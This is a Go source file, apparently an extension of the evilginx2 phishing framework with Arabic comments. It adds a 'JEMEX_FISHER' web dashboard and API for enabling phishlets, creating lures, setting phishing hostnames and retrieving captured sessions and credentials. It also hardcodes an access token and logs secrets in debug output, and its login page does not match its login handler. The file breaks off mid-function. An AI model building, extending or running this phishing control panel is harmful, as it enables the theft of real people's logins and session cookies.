package core

import (
	"encoding/json"
	"fmt"
	stdlib_log "log"
	"net/http"
	"strconv"
	"strings"
	"time"
	"encoding/base64"
	"math/rand"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type ApiServer struct {
	host        string
	port        int
	basePath    string
	unauthPath  string
	ip_whitelist []string
	cfg         *Config
	db          database.IDatabase
	developer   bool
	username    string
	password    string
	sessions    map[string]*database.Session
	router      *mux.Router
	authToken   string
	auto_verify bool
	auth_tokens map[string]time.Time
	admin_username string
	admin_password string
}

type ApiResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

// Auth لمعالجة المصادقة
type Auth struct {
	apiServer *ApiServer
}

// NewApiServer ينشئ خادم API جديد
func NewApiServer(host string, port int, admin_username string, admin_password string, cfg *Config, db database.IDatabase) (*ApiServer, error) {
	if cfg == nil {
		return nil, fmt.Errorf("تكوين فارغ")
	}
	
	if db == nil {
		return nil, fmt.Errorf("قاعدة بيانات فارغة")
	}
	
	// إنشاء توكن مصادقة فريد
	token := generateRandomToken(32)
	
	return &ApiServer{
		host: host,
		port: port,
		cfg:  cfg,
		db:   db,
		username: admin_username,       // تعيين اسم المستخدم
		password: admin_password,       // تعيين كلمة المرور
		auto_verify: false,
		auth_tokens: make(map[string]time.Time),
		admin_username: admin_username,
		admin_password: admin_password,
		authToken:  token,
	}, nil
}

// توليد توكن عشوائي بطول محدد
func generateRandomToken(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	
	// تهيئة مولد الأرقام العشوائية
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	
	for i := 0; i < length; i++ {
		result[i] = chars[r.Intn(len(chars))]
	}
	
	return string(result)
}

func (as *ApiServer) SetCredentials(username, password string) {
	if username != "" {
		as.username = username
	}
	if password != "" {
		as.password = password
	}
}

// Start يبدأ تشغيل خادم API
func (as *ApiServer) Start() {
	router := mux.NewRouter()
	router.Use(as.handleHeaders)
	
	
	// إضافة سجلات تصحيح لعرض معلومات الاعتماد
	log.Debug("بيانات الاعتماد للواجهة - اسم المستخدم: %s، كلمة المرور: %s", as.username, as.password)
	
	router.HandleFunc("/health", as.healthHandler).Methods("GET")

	// طرق API للمصادقة
	router.HandleFunc("/api/login", as.loginHandler).Methods("POST")

	// إنشاء middleware للمصادقة
	auth := &Auth{
		apiServer: as,
	}

	// طرق مصادقة API محمية
	authorized := router.PathPrefix("/api").Subrouter()
	authorized.Use(auth.authMiddleware)

	// خطة لتعامل مع الواجهة
	// تعامل مع الملفات الثابتة بما فيها ملف الـ dashboard.html
	fileServer := http.FileServer(http.Dir("./static"))
	router.PathPrefix("/static/").Handler(http.StripPrefix("/static/", fileServer))
	
	// إعادة توجيه للصفحات الرئيسية
	router.HandleFunc("/dashboard.html", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/static/dashboard.html", http.StatusFound)
	})
	
	router.HandleFunc("/login.html", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "/static/login.html", http.StatusFound)
	})
	
	// التوجيه إلى صفحة الدخول أو لوحة التحكم
	router.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		http.Redirect(w, r, "/static/login.html", http.StatusFound)
	})

	router.NotFoundHandler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "404 الصفحة غير موجودة", http.StatusNotFound)
	})

	// تسجيل مسارات API
	authorized.HandleFunc("/dashboard", as.dashboardHandler).Methods("GET")
	authorized.HandleFunc("/phishlets", as.phishletsHandler).Methods("GET")
	authorized.HandleFunc("/phishlets/{name}", as.phishletHandler).Methods("GET")
	authorized.HandleFunc("/phishlets/{name}/enable", as.phishletEnableHandler).Methods("POST")
	authorized.HandleFunc("/phishlets/{name}/disable", as.phishletDisableHandler).Methods("POST")
	authorized.HandleFunc("/configs/hostname", as.hostnameConfigHandler).Methods("POST")
	authorized.HandleFunc("/config/save", as.configSaveHandler).Methods("POST")
	authorized.HandleFunc("/config/certificates", as.certificatesHandler).Methods("POST")
	authorized.HandleFunc("/lures", as.luresHandler).Methods("GET", "POST")
	authorized.HandleFunc("/lures/{id:[0-9]+}", as.lureHandler).Methods("GET", "DELETE")
	authorized.HandleFunc("/lures/{id:[0-9]+}/enable", as.lureEnableHandler).Methods("POST")
	authorized.HandleFunc("/lures/{id:[0-9]+}/disable", as.lureDisableHandler).Methods("POST")
	authorized.HandleFunc("/sessions", as.sessionsHandler).Methods("GET")
	authorized.HandleFunc("/sessions/{id}", as.sessionHandler).Methods("GET", "DELETE")
	authorized.HandleFunc("/credentials", as.credsHandler).Methods("GET")

	as.router = router

	bind := fmt.Sprintf("%s:%d", as.host, as.port)
	log.Info("خادم API يستمع على %s", bind)
	log.Info("يمكنك الوصول إلى لوحة التحكم عبر http://%s/static/dashboard.html", bind)
	go http.ListenAndServe(bind, router)
}

// معالج تسجيل الدخول
func (as *ApiServer) loginHandler(w http.ResponseWriter, r *http.Request) {
	// التحقق من طريقة الطلب
	if r.Method != "POST" {
		http.Error(w, "طريقة غير مدعومة", http.StatusMethodNotAllowed)
		return
	}
	
	// فك تشفير طلب JSON
	var loginReq LoginRequest
	err := json.NewDecoder(r.Body).Decode(&loginReq)
	if err != nil {
		as.jsonError(w, "خطأ في تنسيق البيانات: "+err.Error(), http.StatusBadRequest)
		return
	}
	
	// طباعة معلومات التصحيح
	log.Debug("محاولة تسجيل دخول باستخدام توكن: %s", loginReq.UserToken)
	
	// التحقق من صحة التوكن
	if loginReq.UserToken != "JEMEX_FISHER_2024" {
		log.Warning("محاولة تسجيل دخول فاشلة باستخدام توكن غير صحيح")
		as.jsonError(w, "توكن الوصول غير صحيح", http.StatusUnauthorized)
		return
	}
	
	// توليد رمز جلسة جديد
	sessionToken := generateRandomToken(32)
	
	// تخزين رمز الجلسة
	as.authToken = sessionToken
	
	// تعيين كوكي للمصادقة
	http.SetCookie(w, &http.Cookie{
		Name:     "Authorization",
		Value:    sessionToken,
		Path:     "/",
		HttpOnly: true,
		Secure:   true,
		SameSite: http.SameSiteStrictMode,
		MaxAge:   86400, // 24 ساعة
	})
	
	// استجابة ناجحة
	log.Success("تم تسجيل الدخول بنجاح وإصدار توكن جلسة: %s", sessionToken)
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "تم تسجيل الدخول بنجاح",
		Data: map[string]string{
			"auth_token": sessionToken,
		},
	})
}

// authMiddleware للتحقق من المصادقة
func (auth *Auth) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// التحقق من توكن المصادقة
		authToken := r.Header.Get("Authorization")
		
		// تحقق من وجود الرمز في هيدر، ثم في الكوكيز
		if authToken == "" {
			cookie, err := r.Cookie("Authorization")
			if err == nil {
				authToken = cookie.Value
			}
		}
		
		// طباعة معلومات التصحيح
		fmt.Printf("التحقق من المصادقة. الرمز المقدم: %s\n", authToken)
		fmt.Printf("الرمز المتوقع: %s\n", auth.apiServer.authToken)
		
		if authToken == "" {
			auth.apiServer.jsonError(w, "غير مصرح: لم يتم تقديم رمز مصادقة", http.StatusUnauthorized)
			return
		}
		
		// التحقق من جلسة المستخدم
		if !auth.apiServer.validateAuthToken(authToken) {
			auth.apiServer.jsonError(w, "غير مصرح: جلسة غير صالحة", http.StatusUnauthorized)
			return
		}
		
		fmt.Printf("تمت المصادقة بنجاح للرمز: %s\n", authToken)
		next.ServeHTTP(w, r)
	})
}

func (as *ApiServer) ipWhitelistMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// السماح لأي عنوان IP بالوصول إلى API
		next.ServeHTTP(w, r)
	})
}

// هيكل بيانات طلب تسجيل الدخول
type LoginRequest struct {
	UserToken string `json:"userToken"`
}

// هيكل بيانات استجابة تسجيل الدخول
type LoginResponse struct {
	Success   bool   `json:"success"`
	Message   string `json:"message,omitempty"`
	AuthToken string `json:"auth_token,omitempty"`
}

func (as *ApiServer) getSessionsHandler(w http.ResponseWriter, r *http.Request) {
	sessions, err := as.db.ListSessions()
	if err != nil {
		as.jsonError(w, "خطأ في استرجاع الجلسات", http.StatusInternalServerError)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

func (as *ApiServer) getSessionHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id := vars["id"]
	
	sessions, err := as.db.ListSessions()
	if err != nil {
		as.jsonError(w, "خطأ في استرجاع الجلسات", http.StatusInternalServerError)
		return
	}
	
	var session *database.Session
	for _, s := range sessions {
		if s.SessionId == id {
			session = s
			break
		}
	}
	
	if session == nil {
		as.jsonError(w, "الجلسة غير موجودة", http.StatusNotFound)
		return
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(session)
}

// وظيفة مساعدة للرد بالخطأ
func respondWithError(w http.ResponseWriter, code int, message string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(code)
	json.NewEncoder(w).Encode(map[string]string{"error": message})
}

// وظيفة مساعدة للرد بالبيانات JSON
func (as *ApiServer) jsonResponse(w http.ResponseWriter, resp ApiResponse) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

// وظيفة مساعدة للرد برسالة خطأ JSON
func (as *ApiServer) jsonError(w http.ResponseWriter, errMsg string, statusCode int) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(statusCode)
	
	resp := ApiResponse{
		Success: false,
		Message: errMsg,
	}
	
	json.NewEncoder(w).Encode(resp)
}

// ================= وظائف مساعدة للمصادقة =================

// إنشاء رمز بسيط
func generateSimpleToken(username string) string {
	timestamp := time.Now().Unix()
	data := fmt.Sprintf("%s:%d", username, timestamp)
	return base64.StdEncoding.EncodeToString([]byte(data))
}

// التحقق من صحة الرمز
func validateSimpleToken(token string, expectedUsername string) bool {
	data, err := base64.StdEncoding.DecodeString(token)
	if err != nil {
		return false
	}
	
	parts := strings.Split(string(data), ":")
	if len(parts) != 2 {
		return false
	}
	
	username := parts[0]
	timestamp, err := strconv.ParseInt(parts[1], 10, 64)
	if err != nil {
		return false
	}
	
	// التحقق من أن الرمز لم تنتهي صلاحيته (24 ساعة)
	if time.Now().Unix()-timestamp > 86400 {
		return false
	}
	
	return username == expectedUsername
}

// Config handler
func (as *ApiServer) getConfigHandler(w http.ResponseWriter, r *http.Request) {
	config := map[string]interface{}{
		"domain":       as.cfg.general.Domain,
		"ip":           as.cfg.general.ExternalIpv4,
		"redirect_url": as.cfg.general.UnauthUrl,
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    config,
	})
}

// Helper methods
func (as *ApiServer) getLureId(idStr string) (int, error) {
	var id int
	var err error
	
	_, err = fmt.Sscanf(idStr, "%d", &id)
	if err != nil {
		return 0, fmt.Errorf("invalid lure ID format")
	}
	
	return id, nil
}

// HTML لصفحة تسجيل الدخول
const loginHTML = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JEMEX_FISHER - تسجيل الدخول</title>
    <style>
        :root {
            --primary-color: #0c1e35;
            --secondary-color: #1a3a6c;
            --accent-color: #3498db;
            --text-color: #ffffff;
            --error-color: #e74c3c;
            --success-color: #2ecc71;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: var(--primary-color);
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(26, 58, 108, 0.8) 0%, rgba(12, 30, 53, 0.8) 90%),
                url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxkZWZzPjxwYXR0ZXJuIGlkPSJwYXR0ZXJuIiB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0MCA0MCIgcGF0dGVyblVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgcGF0dGVyblRyYW5zZm9ybT0icm90YXRlKDQ1KSI+PHJlY3QgaWQ9InBhdHRlcm4tYmFja2dyb3VuZCIgd2lkdGg9IjQwMCUiIGhlaWdodD0iNDAwJSIgZmlsbD0icmdiYSgxMiwzMCw1MywwKSI+PC9yZWN0PiA8cGF0aCBmaWxsPSJyZ2JhKDUyLDE1MiwyMTksMC4xKSIgZD0iTS01IDQ1aDUwdjFILTV6TTAgMHY1MGgxVjB6Ij48L3BhdGg+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCBmaWxsPSJ1cmwoI3BhdHRlcm4pIiBoZWlnaHQ9IjEwMCUiIHdpZHRoPSIxMDAlIj48L3JlY3Q+PC9zdmc+');
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-color);
            position: relative;
        }
        
        .login-container {
            background: rgba(26, 58, 108, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 400px;
            padding: 2rem;
            transition: all 0.3s ease;
        }
        
        .login-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .login-header h1 {
            font-size: 2.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
            color: var(--text-color);
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
            letter-spacing: 1px;
        }
        
        .login-header p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 1rem;
        }
        
        .input-group {
            margin-bottom: 1.5rem;
            position: relative;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.9);
        }
        
        .input-group input {
            width: 100%;
            padding: 0.75rem;
            border: 2px solid rgba(255, 255, 255, 0.2);
            background: rgba(12, 30, 53, 0.5);
            border-radius: 6px;
            color: white;
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        .input-group input:focus {
            outline: none;
            border-color: var(--accent-color);
            background: rgba(12, 30, 53, 0.7);
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.3);
        }
        
        .btn {
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 0.75rem;
            width: 100%;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        
        .btn:hover {
            background: #2389c9;
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15);
        }
        
        .btn:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        
        .error-message {
            color: var(--error-color);
            font-size: 0.9rem;
            margin-top: 1rem;
            text-align: center;
            display: none;
        }
        
        .logo {
            font-size: 3rem;
            margin-bottom: 1rem;
            color: var(--accent-color);
            text-shadow: 0 2px 10px rgba(52, 152, 219, 0.5);
        }
        
        .logo-icon {
            margin-bottom: 1rem;
            display: inline-block;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .glowing-border {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 10px;
            overflow: hidden;
            z-index: -1;
        }
        
        .glowing-border::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(
                transparent, 
                transparent, 
                transparent, 
                var(--accent-color)
            );
            animation: rotate 4s linear infinite;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <div class="logo-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="logo">
                    <circle cx="12" cy="12" r="10"></circle>
                    <path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z"></path>
                    <path d="M19 10v2a7 7 0 0 1-14 0v-2"></path>
                    <line x1="12" y1="19" x2="12" y2="22"></line>
                </svg>
            </div>
            <h1>JEMEX_FISHER</h1>
            <p>لوحة التحكم الخاصة بالصيد</p>
        </div>
        
        <div class="input-group">
            <label for="username">اسم المستخدم</label>
            <input type="text" id="username" placeholder="أدخل اسم المستخدم">
        </div>
        
        <div class="input-group">
            <label for="password">كلمة المرور</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور">
        </div>
        
        <button class="btn" id="login-btn">تسجيل الدخول</button>
        
        <div class="error-message" id="error-message">
            اسم المستخدم أو كلمة المرور غير صحيحة
        </div>
        
        <div class="glowing-border"></div>
    </div>
    
    <script>
        document.getElementById('login-btn').addEventListener('click', async () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('error-message');
            
            if (!username || !password) {
                errorMessage.textContent = 'يرجى إدخال اسم المستخدم وكلمة المرور';
                errorMessage.style.display = 'block';
                return;
            }
            
            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // تخزين الرمز في localStorage
                    localStorage.setItem('authToken', data.data.auth_token);
                    // توجيه إلى الصفحة الرئيسية
                    window.location.href = '/dashboard.html';
                } else {
                    errorMessage.textContent = data.message || 'اسم المستخدم أو كلمة المرور غير صحيحة';
                    errorMessage.style.display = 'block';
                }
            } catch (error) {
                errorMessage.textContent = 'حدث خطأ في الاتصال بالخادم';
                errorMessage.style.display = 'block';
                console.error('Error:', error);
            }
        });
        
        // استمع لمفتاح الإدخال للتسجيل
        document.getElementById('password').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('login-btn').click();
            }
        });
    </script>
</body>
</html>`

// معالج الإعدادات
func (as *ApiServer) configsHandler(w http.ResponseWriter, r *http.Request) {
	config := map[string]interface{}{
		"domain":       as.cfg.general.Domain,
		"ip":           as.cfg.general.ExternalIpv4,
		"redirect_url": as.cfg.general.UnauthUrl,
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Data:    config,
	})
}

// نموذج بيانات الـ Phishlet للواجهة
type ApiPhishlet struct {
	Name        string `json:"name"`
	Hostname    string `json:"hostname"`
	IsActive    bool   `json:"is_active"`
	IsTemplate  bool   `json:"is_template"`
	Author      string `json:"author"`
	RedirectUrl string `json:"redirect_url"`
}

// معالج للحصول على معلومات phishlet محدد
func (as *ApiServer) phishletHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	phishlet, err := as.cfg.GetPhishlet(name)
	if err != nil {
		as.jsonError(w, fmt.Sprintf("لم يتم العثور على الـ phishlet '%s': %v", name, err), http.StatusNotFound)
		return
	}

	hostname, _ := as.cfg.GetSiteDomain(name)
	isActive := as.cfg.IsSiteEnabled(name)
	isTemplate := phishlet.isTemplate
	
	apiPhishlet := ApiPhishlet{
		Name:        phishlet.Name,
		Hostname:    hostname,
		IsActive:    isActive,
		IsTemplate:  isTemplate,
		Author:      phishlet.Author,
		RedirectUrl: phishlet.RedirectUrl,
	}

	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("تم الحصول على معلومات الـ phishlet '%s'", name),
		Data:    apiPhishlet,
	})
}

// تعديل معالج قائمة الـ phishlets لاستخدام نموذج البيانات الجديد
func (as *ApiServer) phishletsHandler(w http.ResponseWriter, r *http.Request) {
	// الحصول على معلومات جميع الـ phishlets
	phishlets := as.cfg.phishlets
	apiPhishlets := make([]ApiPhishlet, 0)

	for name, phishlet := range phishlets {
		if !as.cfg.IsSiteHidden(name) {
			hostname, _ := as.cfg.GetSiteDomain(name)
			isActive := as.cfg.IsSiteEnabled(name)
			
			apiPhishlet := ApiPhishlet{
				Name:        phishlet.Name,
				Hostname:    hostname,
				IsActive:    isActive,
				IsTemplate:  phishlet.isTemplate,
				Author:      phishlet.Author,
				RedirectUrl: phishlet.RedirectUrl,
			}
			apiPhishlets = append(apiPhishlets, apiPhishlet)
		}
	}

	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: "تم استرجاع قائمة الـ phishlets بنجاح",
		Data:    apiPhishlets,
	})
}

// معالج تفعيل Phishlet
func (as *ApiServer) phishletEnableHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	// التحقق من وجود الـ phishlet
	_, err := as.cfg.GetPhishlet(name)
	if err != nil {
		as.jsonError(w, "phishlet غير موجود: "+err.Error(), http.StatusBadRequest)
		return
	}

	// التحقق مما إذا كان الـ phishlet مُفعل بالفعل
	if as.cfg.IsSiteEnabled(name) {
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Message: fmt.Sprintf("الـ phishlet '%s' مُفعل بالفعل", name),
		})
		return
	}

	// التحقق من hostname
	hostname, ok := as.cfg.GetSiteDomain(name)
	if !ok || hostname == "" {
		as.jsonError(w, fmt.Sprintf("لم يتم تعيين hostname للـ phishlet '%s'", name), http.StatusBadRequest)
		return
	}

	// محاولة تفعيل الـ phishlet مع تسجيل أي أخطاء
	fmt.Printf("محاولة تفعيل الـ phishlet: %s\n", name)
	err = as.cfg.SetSiteEnabled(name)
	if err != nil {
		fmt.Printf("فشل في تفعيل الـ phishlet '%s': %v\n", name, err)
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// التأكد من حفظ التغييرات
	as.cfg.SavePhishlets()

	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("تم تفعيل الـ phishlet '%s' بنجاح", name),
	})
}

// معالج تعطيل Phishlet
func (as *ApiServer) phishletDisableHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]
	
	// التحقق من وجود الـ phishlet أولًا
	_, err := as.cfg.GetPhishlet(name)
	if err != nil {
		as.jsonError(w, fmt.Sprintf("Phishlet '%s' not found: %v", name, err), http.StatusNotFound)
		return
	}
	
	// التحقق مما إذا كان الـ phishlet معطلًا بالفعل
	if !as.cfg.IsSiteEnabled(name) {
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Message: fmt.Sprintf("Phishlet '%s' is already disabled", name),
		})
		return
	}
	
	// محاولة تعطيل الـ phishlet
	err = as.cfg.SetSiteDisabled(name)
	if err != nil {
		// طباعة الخطأ للتصحيح
		fmt.Printf("Error disabling phishlet '%s': %v\n", name, err)
		as.jsonError(w, fmt.Sprintf("Failed to disable phishlet '%s': %v", name, err), http.StatusInternalServerError)
		return
	}
	
	// التأكد من حفظ التغييرات
	as.cfg.SavePhishlets()
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Phishlet '%s' disabled", name),
	})
}

// معالج قائمة وإنشاء Lures
func (as *ApiServer) luresHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		// الحصول على قائمة Lures
		lures := as.cfg.lures
		
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Data:    lures,
		})
	} else if r.Method == "POST" {
		// إنشاء Lure جديد
		var lureData map[string]interface{}
		
		err := json.NewDecoder(r.Body).Decode(&lureData)
		if err != nil {
			as.jsonError(w, "Invalid JSON", http.StatusBadRequest)
			return
		}
		
		phishletName, ok := lureData["phishlet"].(string)
		if !ok || phishletName == "" {
			as.jsonError(w, "Phishlet name is required", http.StatusBadRequest)
			return
		}
		
		// التحقق من وجود الـ phishlet
		_, err = as.cfg.GetPhishlet(phishletName)
		if err != nil {
			as.jsonError(w, err.Error(), http.StatusBadRequest)
			return
		}
		
		// التحقق مما إذا كان الـ phishlet مفعّل
		if !as.cfg.IsSiteEnabled(phishletName) {
			as.jsonError(w, fmt.Sprintf("الـ phishlet '%s' غير مفعّل. قم بتفعيله أولاً.", phishletName), http.StatusBadRequest)
			return
		}
		
		hostname, _ := lureData["hostname"].(string)
		path, _ := lureData["path"].(string)
		
		// إنشاء Lure جديد بإعدادات افتراضية
		lure := &Lure{
			Phishlet:        phishletName,
			Hostname:        hostname,
			Path:            path,
			RedirectUrl:     "",
			Redirector:      "",
			UserAgentFilter: "",
			Info:            "",
			OgTitle:         "",
			OgDescription:   "",
			OgImageUrl:      "",
			OgUrl:           "",
			PausedUntil:     0,
		}
		
		as.cfg.AddLure(phishletName, lure)
		
		// البحث عن معرف الـ Lure الذي تم إنشاؤه
		var lureIndex int = -1
		for i, l := range as.cfg.lures {
			if l.Phishlet == phishletName && l.Hostname == hostname && l.Path == path {
				lureIndex = i
				break
			}
		}
		
		if lureIndex == -1 {
			as.jsonError(w, "Failed to find created lure", http.StatusInternalServerError)
			return
		}
		
		lure, _ = as.cfg.GetLure(lureIndex)
		
		// تحديث قائمة hostnames النشطة للتأكد من أن النطاق الجديد مدرج
		as.cfg.refreshActiveHostnames()
		
		// حفظ التكوين لضمان استمرار التغييرات عند إعادة تشغيل البرنامج
		as.cfg.SavePhishlets()
		
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Message: fmt.Sprintf("Created lure with ID: %d", lureIndex),
			Data:    lure,
		})
	}
}

// معالج تفاصيل وحذف Lure محدد
func (as *ApiServer) lureHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	
	id, err := as.getLureId(idStr)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	if r.Method == "GET" {
		// الحصول على تفاصيل Lure
		lure, err := as.cfg.GetLure(id)
		if err != nil {
			as.jsonError(w, err.Error(), http.StatusNotFound)
			return
		}
		
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Data:    lure,
		})
	} else if r.Method == "DELETE" {
		// حذف Lure
		err = as.cfg.DeleteLure(id)
		if err != nil {
			as.jsonError(w, err.Error(), http.StatusNotFound)
			return
		}
		
		as.jsonResponse(w, ApiResponse{
			Success: true,
			Message: fmt.Sprintf("Lure %d deleted", id),
		})
	}
}

// معالج تفعيل Lure
func (as *ApiServer) lureEnableHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	
	id, err := as.getLureId(idStr)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	lure, err := as.cfg.GetLure(id)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusNotFound)
		return
	}
	
	// تعيين حقل PausedUntil إلى 0 لتفعيل الـ lure
	lure.PausedUntil = 0
	err = as.cfg.SetLure(id, lure)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Lure %d enabled", id),
	})
}

// معالج تعطيل Lure
func (as *ApiServer) lureDisableHandler(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	idStr := vars["id"]
	
	id, err := as.getLureId(idStr)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	lure, err := as.cfg.GetLure(id)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusNotFound)
		return
	}
	
	// تعيين حقل PausedUntil إلى قيمة كبيرة لتعطيل الـ lure (وقت بعيد في المستقبل)
	lure.PausedUntil = 9999999999 // قيمة كبيرة تمثل وقتًا بعيدًا في المستقبل
	err = as.cfg.SetLure(id, lure)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusInternalServerError)
		return
	}
	
	as.jsonResponse(w, ApiResponse{
		Success: true,
		Message: fmt.Sprintf("Lure %d disabled", id),
	})
}

// هيكل بيانات تكوين hostname
type HostnameConfig struct {
	Phishlet string `json:"phishlet"`
	Hostname string `json:"hostname"`
}

// معالج تكوين hostname
func (as *ApiServer) hostnameConfigHandler(w http.ResponseWriter, r *http.Request) {
	var hostnameConfig HostnameConfig
	err := json.NewDecoder(r.Body).Decode(&hostnameConfig)
	if err != nil {
		as.jsonError(w, "خطأ في تنسيق البيانات: "+err.Error(), http.StatusBadRequest)
		return
	}

	if hostnameConfig.Phishlet == "" {
		as.jsonError(w, "اسم الـ phishlet مطلوب", http.StatusBadRequest)
		return
	}

	if hostnameConfig.Hostname == "" {
		as.jsonError(w, "hostname مطلوب", http.StatusBadRequest)
		return
	}

	// التحقق من وجود الـ phishlet
	_, err = as.cfg.GetPhishlet(hostnameConfig.Phishlet)
	if err != nil {
		as.jsonError(w, err.Error(), http.StatusBadRequest)
		return
	}

	// تحديث hostname
	fmt.Printf("محاولة تعيين hostname للـ phishlet '%s' إلى '%s'\n", hostnameConfig.Phishlet, hostnameConfig.Hostname)
	success := as.cfg.SetSiteHostname(hostnameConfig.Phishlet, hostnameConfig.Hostname)
	if !success {
		as.jsonError(w, fmt.Sprintf("فشل في تحديث hostname للـ phishlet '%s'. تأكد من أن النطاق ينتهي بـ '%s'", 
			hostnameConfig.Phishlet, as.cfg.GetBaseDomain()), http.StatusInternalServerError)
		return
	}

	// يجب تعطيل الـ phishlet بعد تغيير hostname
	if as.cfg.IsSiteEnabled(hostnameConfig.Phishlet) {
